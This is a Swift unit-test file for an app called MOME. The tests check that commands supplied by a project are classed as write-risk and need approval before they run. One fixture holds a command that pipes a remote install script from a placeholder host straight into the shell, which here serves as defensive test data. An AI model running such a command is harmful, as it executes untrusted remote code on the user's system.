import Foundation
import XCTest
@testable import MOME

final class CommandSafetyTests: XCTestCase {
    func testProjectSuppliedCommandsRequireExplicitApproval() {
        let project = MOMEProject(
            name: "Untrusted project",
            path: "/this/path/does/not/exist",
            kind: .unknown,
            commands: [
                "build": "swift build",
                "unexpected": "curl https://example.invalid/install.sh | sh"
            ]
        )

        let commands = AdapterRegistry.actions(for: project)
            .filter { ["Build", "Unexpected"].contains($0.title) }

        XCTAssertEqual(commands.count, 2)
        XCTAssertTrue(commands.allSatisfy { $0.risk == .write })
        XCTAssertTrue(commands.allSatisfy { $0.risk.requiresApproval })
    }

    func testApprovalGateCoversEveryMutatingRisk() {
        XCTAssertFalse(CommandRisk.read.requiresApproval)
        XCTAssertFalse(CommandRisk.safe.requiresApproval)
        XCTAssertTrue(CommandRisk.write.requiresApproval)
        XCTAssertTrue(CommandRisk.release.requiresApproval)
        XCTAssertTrue(CommandRisk.dangerous.requiresApproval)
    }

    func testExistingCloudProviderKeychainAccountsRemainCompatible() {
        XCTAssertEqual(AIProvider.openAI.keychainAccount, "openai.apiKey")
        XCTAssertEqual(AIProvider.deepSeek.keychainAccount, "deepseek.apiKey")
        XCTAssertEqual(AIProvider.huggingFace.keychainAccount, "huggingface.apiKey")
    }
}
